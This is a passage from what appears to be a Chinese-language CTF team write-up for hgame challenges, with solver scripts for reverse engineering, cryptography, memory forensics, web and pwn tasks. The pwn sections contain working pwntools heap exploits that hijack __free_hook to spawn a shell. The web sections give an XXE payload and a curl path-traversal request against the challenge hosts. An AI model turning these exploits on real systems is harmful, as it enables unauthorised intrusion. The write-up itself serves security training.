0xf8,\u0026#34;cccc\u0026#34;) show(1) libc.address = u64(p.recvuntil(b\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - 96 - 0x10 - libc.sym[\u0026#39;__malloc_hook\u0026#39;] print(hex(libc.address)) # gdb.attach(p, \u0026#34;b *$rebase(0x144B)\u0026#34;) add(2, 0x88,\u0026#34;cccc\u0026#34;) free(2) edit(1, p64(libc.sym[\u0026#34;__free_hook\u0026#34;])[:-1]) add(13, 0x88, p64(libc.sym[\u0026#34;__free_hook\u0026#34;])) add(14, 0x88, p64(libc.sym[\u0026#34;system\u0026#34;])) free(5) p.interactive() # 0x4f3d5 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) # constraints: # rsp \u0026amp; 0xf == 0 # rcx == NULL # 0x4f432 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) # constraints: # [rsp+0x40] == NULL # 0x10a41c execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) # constraints: # [rsp+0x70] == NULL [RE]Answer\u0026rsquo;s windows  By s0uthwood\n 使用 right.png 字符串能够定位到验证函数\n动调发现使用了 string 的存储方式（好像就是把 string 内联了），只使用了 Base64 编码\n但 base 表和目标对应不上，显然是有反调试，自己做的时候直接猜到了真实表是 ascii 的前 64 个可见字符\n或者根据交叉引用找到 debug，把反调试判断 nop 掉再动调即可\n\r\n[RE]creakme_3  By s0uthwood\n PPC 架构，用 ghidra 看的\nundefined4 main(void) { int fs; int randnum; int j; int order_cnt; int i; int order [89]; int canary; canary = *(int *)(fs + -0x7008); memset(order,0,0x164); printf(\u0026#34;Welcome my whitegive re task! This is your flag: \u0026#34;); do { for (j = 0; j \u0026lt; 0x59; j = j + 1) { randnum = rand(); order[j] = randnum % 0x59; } order_cnt = 1; while ((order_cnt \u0026lt; 0x59 \u0026amp;\u0026amp; (a[order[order_cnt + -1] * 2 + 1] \u0026lt;= a[order[order_cnt] * 2 + 1]))) { order_cnt = order_cnt + 1; } } while (order_cnt != 0x59); for (i = 0; i \u0026lt; 0x59; i = i + 1) { putchar(a[order[i] * 2]); } if (canary == *(int *)(fs + -0x7008)) { return 0; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } 手动恢复了一下符号，简单的说就是只有满足顺序都是 \u0026lt;= 的时候才能退出第一个循环，所以 rand() 只是个忽悠人并且浪费时间的东西（后来知道这个东西叫猴子加密）\n所以提取一下数字然后排序就行\na = [ (0x30, 0x4E7D), (0x30, 0x67BD), (0x30, 0x7A48), (0x30, 0x82A2), (0x30, 0x933E), (0x31, 0x9C18), (0x32, 0x5AFF), (0x32, 0x6CD7), (0x32, 0xA6CA), (0x32, 0xBD79), (0x32, 0xCEBD), (0x33, 0x324A), (0x33, 0x3292), (0x33, 0x3905), (0x33, 0x4291), (0x33, 0x5ADE), (0x33, 0x6E9F), (0x33, 0xA52A), (0x33, 0xBE35), (0x33, 0xCB63), (0x35, 0x7F3B), (0x38, 0x3914), (0x38, 0xB2AD), (0x39, 0x38DA), (0x39, 0x4E50), (0x39, 0x6A02), (0x39, 0xB10F), (0x42, 0x78E5), (0x5F, 0x7EF6), (0x5F, 0x89A3), (0x5F, 0x8EBD), (0x5F, 0x95E3), (0x61, 0x73DA), (0x64, 0x538C), (0x64, 0x633B), (0x64, 0x9E9C), (0x64, 0xB78B), (0x64, 0xC866), (0x65, 0x32AE), (0x65, 0x7679), (0x66, 0x2AE7), (0x66, 0x4D6A), (0x66, 0x5708), (0x66, 0x6610), (0x66, 0xA258), (0x66, 0xB80C), (0x66, 0xC885), (0x67, 0x710A), (0x67, 0x7CF4), (0x68, 0x3F76), (0x68, 0x702B), (0x68, 0xA3EE), (0x68, 0xAD50), (0x68, 0xBAC7), (0x69, 0x4024), (0x69, 0x8A22), (0x69, 0xC055), (0x6A, 0x2B52), (0x6A, 0xC687), (0x6B, 0x5F00), (0x6B, 0xC417), (0x6C, 0x6182), (0x6D, 0x75DB), (0x6E, 0x3C61), (0x6E, 0x4996), (0x6E, 0x5DC1), (0x6F, 0x2D76), (0x6F, 0x7D17), (0x6F, 0xA91B), (0x70, 0x9AED), (0x72, 0x45D0), (0x72, 0x8467), (0x72, 0xAB5D), (0x73, 0x5083), (0x73, 0x6222), (0x73, 0x8D93), (0x73, 0x923A), (0x73, 0x971E), (0x73, 0xB4BA), (0x73, 0xC785), (0x74, 0x3558), (0x74, 0x86BD), (0x74, 0x9738), (0x75, 0x3710), (0x75, 0x9779), (0x77, 0x2F3F), (0x77, 0x44DD), (0x7B, 0x78E1), (0x7D, 0x9F42) ] def takeSecond(elem): return elem[1] a.sort(key=takeSecond) for i in a: print (chr(i[0]), end=\u0026#39;\u0026#39;) # fjow33etu938nhi3wrnf90sdf32nklsdf0923hgame{B0go_50rt_is_s0_stup1d}fh32orh98sdfh23ikjsdf32 [RE]fishman  By s0uthwood\n pyd逆向\n先定位函数\n搜索字符串，能看到几个函数名\n\r\n比如 init 函数就是 sub_180002670\n接下来就是密码算法识别\n查看一下 init 和 check 函数，这题使用的是 blowfish 密码，之前没有遇到过，所以是靠着 findcrypt 脚本识别出来的\n顺便放一下搜到的加密算法源码，来源是 https://gitee.com/miao123456miao/blowfish2\n这是一个分组密码，主要的特征就是 f 函数\n剩下的也没什么特别的，贴一下求解脚本吧\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; #include \u0026#34;blowfish.h\u0026#34; void swap(uint32_t* a, uint32_t* b) { uint32_t tmp; tmp = *a; *a = *b; *b = tmp; } uint32_t blowfish_f(blowfish_t* container, uint32_t input) { uint8_t a, b, c, d; a = input \u0026gt;\u0026gt; 24; b = (input \u0026gt;\u0026gt; 16) \u0026amp; 0xff; c = (input \u0026gt;\u0026gt; 8) \u0026amp; 0xff; d = input \u0026amp; 0xff; return ((container-\u0026gt;s[0][a] + container-\u0026gt;s[1][b]) ^ container-\u0026gt;s[2][c]) + container-\u0026gt;s[3][d]; } void blowfish_cipher(blowfish_t* container, uint32_t* xl, uint32_t* xr, uint8_t mode) { int i; uint32_t loc_xl, loc_xr; loc_xl = *xl; loc_xr = *xr; if(mode == BLOWFISH_ENCRYPT) { for(i = 0; i \u0026lt; PASSES; i++) { loc_xl = loc_xl ^ container-\u0026gt;p[i]; loc_xr = blowfish_f(container, loc_xl) ^ loc_xr; swap(\u0026amp;loc_xl, \u0026amp;loc_xr); } } else if(mode == BLOWFISH_DECRYPT) { for(i = PASSES+1; i \u0026gt; 1; i--) { loc_xl = loc_xl ^ container-\u0026gt;p[i]; loc_xr = blowfish_f(container, loc_xl) ^ loc_xr; swap(\u0026amp;loc_xl, \u0026amp;loc_xr); } } swap(\u0026amp;loc_xl, \u0026amp;loc_xr); if(mode == BLOWFISH_ENCRYPT) { loc_xr = loc_xr ^ container-\u0026gt;p[PASSES]; loc_xl = loc_xl ^ container-\u0026gt;p[PASSES+1]; } else if(mode == BLOWFISH_DECRYPT) { loc_xr = loc_xr ^ container-\u0026gt;p[1]; loc_xl = loc_xl ^ container-\u0026gt;p[0]; } *xl = loc_xl; *xr = loc_xr; } blowfish_t* blowfish_initialize(unsigned char* key, uint32_t length) { blowfish_t* container = malloc(sizeof(blowfish_t)); unsigned int i, ii, j = 0; uint32_t tmp, tmp_l = 0, tmp_r = 0; if(length \u0026gt; BLOWFISH_MAX_KEY_BYTES) return (blowfish_t*) NULL; for(i = 0; i \u0026lt; PASSES+2; i++) { container-\u0026gt;p[i] = P[i]; } for(i = 0; i \u0026lt; SBOXES; i++) { for(ii = 0; ii \u0026lt; 256; ii++) { container-\u0026gt;s[i][ii] = S[i][ii]; } } for(i = 0; i \u0026lt; PASSES+2; i++) { tmp = 0; for(ii = 0; ii \u0026lt; 4; ii++) { tmp = (tmp \u0026lt;\u0026lt; 8) | key[j]; j++; if(j == length) j = 0; } container-\u0026gt;p[i] = container-\u0026gt;p[i] ^ tmp; } for(i = 0; i \u0026lt; PASSES+1; i += 2) { blowfish_cipher(container, \u0026amp;tmp_l, \u0026amp;tmp_r, BLOWFISH_ENCRYPT); container-\u0026gt;p[i] = tmp_l; container-\u0026gt;p[i+1] = tmp_r; } for(i = 0; i \u0026lt; SBOXES; i++) { for(ii = 0; ii \u0026lt; 256; ii += 2) { blowfish_cipher(container, \u0026amp;tmp_l, \u0026amp;tmp_r, BLOWFISH_ENCRYPT); container-\u0026gt;s[i][ii] = tmp_l; container-\u0026gt;s[i][ii+1] = tmp_r; } } } int main(int argc, char** argv) { uint32_t high, low; blowfish_t* container = blowfish_initialize(\u0026#34;LET_U_D\u0026#34;, 7); high = 1416580799u; low = 3035468667u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); high = 2194841726u; low = 332656605u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); high = 571059727u; low = 1498341217u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); high = 3107158060u; low = 470279474u; blowfish_cipher(container, \u0026amp;high, \u0026amp;low, BLOWFISH_DECRYPT); write(1, \u0026amp;high, 4); write(1, \u0026amp;low, 4); return 0; } blowfish.h 去仓库找就行\n 试了一下 pycrypto 库，解出来的有问题，可能库的实现和这个有区别，没深入研究\n [Crypto]Block Cipher  By S1eepy\n import operator from libnum import n2s from functools import reduce def xor(a, b): assert len(a) == len(b) return bytes(map(operator.xor, a, b)) iv = b\u0026#39;Up\\x14\\x98r\\x14%\\xb9\u0026#39; key = b\u0026#39;\\r\\xe8\\xb86\\x9c33^\u0026#39; parts = [b\u0026#39;0\\xff\\xcd\\xc3\\x8b\\\\T\\x8b\u0026#39;, b\u0026#39;RT\\x1e\\x89t\u0026amp;\\x17\\xbd\u0026#39;, b\u0026#39;\\x1a\\xee\\x8d\\xd6\\x9b\u0026gt;w\\x8c\u0026#39;, b\u0026#39;9CT\\xb3^pF\\xd0\u0026#39;] flag = [] for i in range(3, -1, -1): if i == 0: flag.append(reduce(xor, [parts[i], iv, key])) else: flag.append(reduce(xor, [parts[i], parts[i - 1], key])) print(flag[::-1]) # hgame{BloCk|cIphER+is+So.EaSY} [Crypto]Multi Prime RSA  By S1eepy\n from gmpy2 import invert from libnum import n2s p = 61789932148719477384027458333380568978056286136137829092952317307711908353477 q = 91207969353355763685633284378833506319794714507027332929290701748727534193861 r = 105471299607375388622347272479207944509670502835651250945203397530010861809367 s = 83153238748903772448138307505579799277162652151244477391465130504267171881437 n = 1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919 e = 65537 c = 844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713 phi = (p ** 2 - p) * (q ** 3 - q ** 2) * (r ** 5 - r ** 4) * (s ** 7 - s ** 6) d = invert(e, phi) print(n2s(pow(c, int(d), n))) [Crypto]RSA Attack 3  By S1eepy\n 维纳攻击，github 上找个脚本解出 d 即可\nhttps://github.com/pablocelayes/rsa-wiener-attack\nfrom libnum import n2s n = 507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759 e = 77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095 c = 165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224 d = 13094612077654083919 print(n2s(pow(c, d, n))) # hgame{dO|YOU:kNOw!tHE*PRINcIplE*bEhInd%WInNEr#aTTacK} [Misc]卡中毒  By NULLPointer\n 题目给出了一个 raw 文件，提示本题考查内存审计的知识点。使用内存审计工具 volativity 查看文件信息。\n首先查看系统配置，使用指令 imageinfo 指令查看系统文件，发现主系统为 Win7SP1x64。\n\r\n随后使用 pslist 和 filescan 指令查看运行程序和系统文件，为加快扫描速度只提取 flag 等关键词，发现名为 flag.txt.txt.7z 和 flag.txt.txt.WannaRen 的文件。\n\r\n使用 dumpfiles 指令提取文件，用 HexEditor 扫描无异常，打开 flag.txt.txt.WannaRen 文件发现内容被加密，无法阅读。查阅相关资料得知系统感染了 WannaRen 病毒导致系统内部存储文件被加密。WannaRen 使用 RC4 和 RSA 的混合加密模式，加密后的文件名会被修改为 WannaRen，只能使用对应的 RSA 私钥解密，无法被暴力破解。目前已有针对该病毒的解密工具，下载解密工具并按照操作流程解密得到 flag.txt.txt 文件。\n\r\n\r\n文件内容使用新与佛论禅加密，使用解密网站 http://hi.pcmoe.net/buddha.html 解密即可得到flag。\n\r\nweek4 [Web]Comment  By SSGSS\n 代码中允许引入外部实体，libxml_disable_entity_loader(false);\n协议过滤的比较死，但是能通过 compress.zlib:// 这个协议拿到 /etc/passwd 这种，但是还是拿不到源码，因为源码里有 php。\n于是利用 data 协议的输入流，将输入流 base64，将外部实体导入到 \u0026lt;sender\u0026gt; 当中，绕过 waf。\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;data://text/plain;base64,YWRtaW4=\u0026#34; \u0026gt;]\u0026gt; \u0026lt;comment\u0026gt;\u0026lt;sender\u0026gt;\u0026amp;xxe;\u0026lt;/sender\u0026gt;\u0026lt;content\u0026gt;\u0026lt;/content\u0026gt;sb\u0026lt;/comment\u0026gt; pil1ow 师傅的做法非预期了，用 html 实体编码绕，不用引入外部实体。\n\u0026lt;comment\u0026gt;\u0026lt;sender\u0026gt;\u0026amp;#97;\u0026amp;#100;\u0026amp;#109;\u0026amp;#105;\u0026amp;#110;\u0026lt;/sender\u0026gt;\u0026lt;content\u0026gt;sb\u0026lt;/content\u0026gt;\u0026lt;/comment\u0026gt; 好文章：\n XXE - XEE - XML External Entity - HackTricks\n [Web]FileSystem  By SSGSS\n $ curl --path-as-is -X CONNECT http://1e4c3338e4.filesystem.hgame.homeboyc.cn/main.go/../there_may_be_a_flag hgame{79f33a8b9913e797c56375c6a78865dc439578f70d572b9a402f1ad57f7eb856} [Pwn]vector  By triplewings\n  了解 vector 的申请原理，制造 double_free  from pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./vector\u0026#34;) # p = remote(\u0026#34;chuj.top\u0026#34;, 51445) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) # def proof(y): # may = string.ascii_letters+string.digits # for i in may: # for j in may: # for k in may: # for l in may: # res = i +j +k +l # if hashlib.sha256((res).encode()).hexdigest() == y: # p.sendline(res) # return # print(\u0026#39;Wrong!\u0026#39;) # p.recvuntil(b\u0026#34; == \u0026#34;) # a = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1].decode() # print(a) # proof(a) def menu(i): p.sendlineafter(b\u0026#34;farewell\u0026#34;, str(i)) def add(idx, size, content): menu(1) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) p.sendlineafter(b\u0026#34;size?\u0026#34;, str(size)) p.sendafter(b\u0026#34;content?\u0026#34;, content) def show(idx): menu(3) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) def free(idx): menu(4) p.sendlineafter(b\u0026#34;index?\u0026#34;, str(idx)) def move(f, t): menu(5) for i in range(f): p.sendlineafter(\u0026#34;[1/0]\\n\u0026gt;\u0026gt; \u0026#34;, b\u0026#34;0\u0026#34;) p.sendlineafter(\u0026#34;[1/0]\\n\u0026gt;\u0026gt; \u0026#34;, b\u0026#34;1\u0026#34;) p.sendlineafter(\u0026#34;\u0026gt;\u0026gt;\u0026#34;, str(t)) for i in range(8): add(i, 0x100, b\u0026#34;aaaa\u0026#34;) for i in range(8,10): add(i, 0x70, b\u0026#34;aaaa\u0026#34;) for i in range(1,8): free(i) free(0) add(0, 0x50, b\u0026#39;aaaaaaaa\u0026#39;) show(0) libc.address = u64(p.recvuntil(b\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#34;__malloc_hook\u0026#34;] - 0x170 print(hex(libc.address)) for i in range(1, 8): add(i, 0x70, b\u0026#39;aaa\u0026#39;) move(2, 17) add(10, 0x70, b\u0026#39;idx:10\u0026#39;) for i in range(3, 10): free(i) free(2) free(10) free(17) for i in range(2, 9): add(i, 0x70, \u0026#39;\\n\u0026#39;) add(9, 0x70, p64(libc.sym[\u0026#34;__free_hook\u0026#34;])) add(11, 0x70, b\u0026#39;pass\\n\u0026#39;) add(12, 0x70, b\u0026#39;/bin/sh\\x00\\n\u0026#39;) add(17, 0x70, p64(libc.sym[\u0026#34;system\u0026#34;])) free(12) gdb.attach(p) p.interactive() [RE]WOW  By s0uthwood\n 这题几乎和天堂之门没关系，主要是把密钥隐藏了，运算之后应该是 12345678，但也可以直接用 windbg 动调拿到轮密钥\n通过置换函数+明显的常数特征判断是 DES，直接解密就行\n网上抄了份 DES，改一改就行\nsolve.c\n#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026#34;bool.h\u0026#34;#include \u0026#34;tables.h\u0026#34; void BitsCopy(bool *DatOut,bool *DatIn,int Len); void ByteToBit(bool *DatOut,char *DatIn,int Num); void BitToByte(char *DatOut,bool *DatIn,int Num); void BitToHex(char *DatOut,bool *DatIn,int Num); void HexToBit(bool *DatOut,char *DatIn,int Num); void TablePermute(bool *DatOut,bool *DatIn,const char *Table,int Num); void LoopMove(bool *DatIn,int Len,int Num); void Xor(bool *DatA,bool *DatB,int Num); void S_Change(bool DatOut[32],bool DatIn[48]); void F_Change(bool DatIn[32],bool DatKi[48]); void SetKey(char KeyIn[8]); void PlayDes(char MesOut[8],char MesIn[8]); void KickDes(char MesOut[8],char MesIn[8]); int main() { char MesHex[64]={\u0026#34;92028926CF6497655A09A46F3A079DB14320B10556683353BB5AF969BBB23EA2\u0026#34;}; // 16个字符数组用于存放 64位16进制的密文  char MyMessage[32]={0}; KickDes(MyMessage,MesHex); KickDes(MyMessage+8,MesHex+16); KickDes(MyMessage+16,MesHex+32); KickDes(MyMessage+24,MesHex+48); printf(\u0026#34;Deciphering Over !!:\\n\u0026#34;); for(int i = 0; i \u0026lt; 32; i++) { printf(\u0026#34;%c\u0026#34;, MyMessage[i]); } printf(\u0026#34;\\n\u0026#34;); system(\u0026#34;pause\u0026#34;); } void BitsCopy(bool *DatOut,bool *DatIn,int Len) { for(int i=0; i \u0026lt; Len; i++) { DatOut[i] = DatIn[i]; } } void ByteToBit(bool *DatOut,char *DatIn,int Num) { for(int i = 0; i \u0026lt; Num; i++) { DatOut[i] = (DatIn[i / 8] \u0026gt;\u0026gt; (i % 8)) \u0026amp; 0x01; } } void BitToByte(char *DatOut,bool *DatIn,int Num) { for(int i = 0; i \u0026lt; (Num / 8); i++) { DatOut[i] = 0; } for(int i = 0; i \u0026lt; Num; i++) { DatOut[i / 8] |= DatIn[i] \u0026lt;\u0026lt; (i % 8); } } void BitToHex(char *DatOut,bool *DatIn,int Num) { int i; for(i = 0; i \u0026lt; Num / 4; i++) { DatOut[i] = 0; } for(i = 0; i \u0026lt; Num / 4; i++) { DatOut[i] = DatIn[i * 4] + (DatIn[i * 4 + 1] \u0026lt;\u0026lt; 1) + (DatIn[i * 4 + 2] \u0026lt;\u0026lt; 2) + (DatIn[i * 4 + 3] \u0026lt;\u0026lt; 3); if((DatOut[i] % 16) \u0026gt; 9) { DatOut[i] = DatOut[i] % 16 + \u0026#39;7\u0026#39;; } else { DatOut[i] = DatOut[i] % 16 + \u0026#39;0\u0026#39;; } } } void HexToBit(bool *DatOut,char *DatIn,int Num) { for(int i = 0; i \u0026lt; Num; i++) { if((DatIn[i / 4]) \u0026gt; \u0026#39;9\u0026#39;) { DatOut[i] = ((DatIn[i / 4] - \u0026#39;7\u0026#39;) \u0026gt;\u0026gt; (i % 4)) \u0026amp; 0x01; } else { DatOut[i] = ((DatIn[i / 4] - \u0026#39;0\u0026#39;) \u0026gt;\u0026gt; (i % 4)) \u0026amp; 0x01; } } } void TablePermute(bool *DatOut,bool *DatIn,const char *Table,int Num) { static bool Temp[256] = {0}; for(int i = 0; i \u0026lt; Num; i++) { Temp[i] = DatIn[Table[i] - 1]; } BitsCopy(DatOut, Temp, Num); } void LoopMove(bool *DatIn,int Len,int Num) { static bool Temp[256]={0}; BitsCopy(Temp,DatIn,Num); BitsCopy(DatIn,DatIn+Num,Len-Num); BitsCopy(DatIn+Len-Num,Temp,Num); } void Xor(bool *DatA,bool *DatB,int Num) { for(int i = 0; i \u0026lt; Num; i++) { DatA[i] = DatA[i] ^ DatB[i]; } } void S_Change(bool DatOut[32],bool DatIn[48]) { int i,X,Y; for(i = 0, Y = 0, X = 0; i \u0026lt; 8; i++, DatIn += 6, DatOut += 4) { Y=(DatIn[0] \u0026lt;\u0026lt; 1) + DatIn[5]; X=(DatIn[1] \u0026lt;\u0026lt; 3) + (DatIn[2] \u0026lt;\u0026lt; 2) + (DatIn[3] \u0026lt;\u0026lt; 1) + DatIn[4]; int v9 = S_Box[i][Y][X]; for(int j = 3; j \u0026gt;= 0; j--) { DatOut[j] = v9 % 2; v9 /= 2; } } } void F_Change(bool DatIn[32],bool DatKi[48]) { static bool MiR[48]={0}; TablePermute(MiR,DatIn,E_Table,48); Xor(MiR,DatKi,48); S_Change(DatIn,MiR); TablePermute(DatIn,DatIn,P_Table,32); } void SetKey(char KeyIn[8]) { static bool KeyBit[64] = {0}; static bool *KiL = \u0026amp;KeyBit[0], *KiR = \u0026amp;KeyBit[28]; ByteToBit(KeyBit, KeyIn, 64); TablePermute(KeyBit, KeyBit, PC1_Table, 56); for(int i = 0; i \u0026lt; 16; i++) { LoopMove(KiL, 28, Move_Table[i]); LoopMove(KiR, 28, Move_Table[i]); TablePermute(SubKey[i], KeyBit, PC2_Table, 48); } } void PlayDes(char MesOut[8],char MesIn[8]) { int i; static bool MesBit[64] = {0}; static bool Temp[32] = {0}; static bool *MiL = \u0026amp;MesBit[0], *MiR = \u0026amp;MesBit[32]; ByteToBit(MesBit, MesIn, 64); TablePermute(MesBit, MesBit, IP_Table, 64); for (i = 0; i \u0026lt; 64; i++) { printf(\u0026#34;%d \u0026#34;, MesBit[i]); } printf(\u0026#34;\\n\u0026#34;); for(i = 0; i \u0026lt; 16; i++) { BitsCopy(Temp, MiR, 32); F_Change(MiR, SubKey[i]); Xor(MiR, MiL, 32); BitsCopy(MiL, Temp, 32); for (int j = 0; j \u0026lt; 64; j++){ printf(\u0026#34;%d \u0026#34;, MesBit[j]); } printf(\u0026#34;\\n\u0026#34;); } for(i = 0; i \u0026lt; 32; i++) { int tmp = MesBit[i]; MesBit[i] = MesBit[i + 32]; MesBit[i + 32] = tmp; } TablePermute(MesBit, MesBit, IPR_Table, 64); for (i = 0; i \u0026lt; 64; i++){ printf(\u0026#34;%d \u0026#34;, MesBit[i]); } BitToHex(MesOut,MesBit,64); } void KickDes(char MesOut[8],char MesIn[8]) { int i; static bool MesBit[64] = {0}; static bool Temp[32] = {0}; static bool *MiL = \u0026amp;MesBit[0], *MiR = \u0026amp;MesBit[32]; HexToBit(MesBit, MesIn, 64); TablePermute(MesBit, MesBit, IP_Table, 64); for (i = 0; i \u0026lt; 32; i++) { int tmp = MesBit[i]; MesBit[i] = MesBit[i + 32]; MesBit[i + 32] = tmp; } for(i = 15; i \u0026gt;= 0; i--) { BitsCopy(Temp, MiL, 32); F_Change(MiL, SubKey[i]); Xor(MiL, MiR, 32); BitsCopy(MiR, Temp, 32); } TablePermute(MesBit, MesBit, IPR_Table, 64); for (i = 0; i \u0026lt; 64; i++){ printf(\u0026#34;%d \u0026#34;, MesBit[i]); } BitToByte(MesOut, MesBit, 64); } bool.h，我的评价是不如直接上 c++\n#ifndef __BOOL_H__ #define __BOOL_H__  typedef enum { false = 0, true = 1 } bool; #endif tables.h，之前找到的文件有几处与题目中不同，不知道是作者写错了还是题目改数了，直接把算好的 subkey 填到这里，就不用再输入密钥算了\n#ifndef _TABLES_H_ #define _TABLES_H_  const char IP_Table[64]={ 58,50,42,34,26,18,10, 2,60,52,44,36,28,20,12, 4, 62,54,46,38,30,22,14, 6,64,56,48,40,32,24,16, 8, 57,49,41,33,25,17, 9, 1,59,51,43,35,27,19,11, 3, 61,53,45,37,29,21,13, 5,63,55,47,39,31,23,15, 7 }; const char IPR_Table[64]={ 40, 8,48,16,56,24,64,32,39, 7,47,15,55,23,63,31, 38, 6,46,14,54,22,62,30,37, 5,45,13,53,21,61,29, 36, 4,44,12,52,20,60,28,35, 3,43,11,51,19,59,27, 34, 2,42,10,50,18,58,26,33, 1,41, 9,49,17,57,25\t}; static char E_Table[48]={ 32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9,10,11,12,13,12,13,14,15,16,17, 16,17,18,19,20,21,20,21,22,23,24,25, 24,25,26,27,28,29,28,29,30,31,32, 1 }; static char PC1_Table[56]={ 57,49,41,33,25,17, 9, 1,58,50,42,34,26,18, 10, 2,59,51,43,35,27,19,11, 3,60,52,44,36, 63,55,47,39,31,23,15, 7,62,54,46,38,30,22, 14, 6,61,53,45,37,29,21,13, 5,28,20,12, 4 }; static char Move_Table[16]={ 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 }; static char PC2_Table[48]={ 14,17,11,24, 1, 5, 3,28,15, 6,21,10, 23,19,12, 4,26, 8,16, 7,27,20,13, 2, 41,52,31,37,47,55,30,40,51,45,33,48, 44,49,39,56,34,53,46,42,50,36,29,32\t}; static char S_Box[8][4][16]={ //S1 \t14, 4,13, 1, 2,15,11, 8, 3,10, 6,12, 5, 9, 0, 7, 0,15, 7, 4,14, 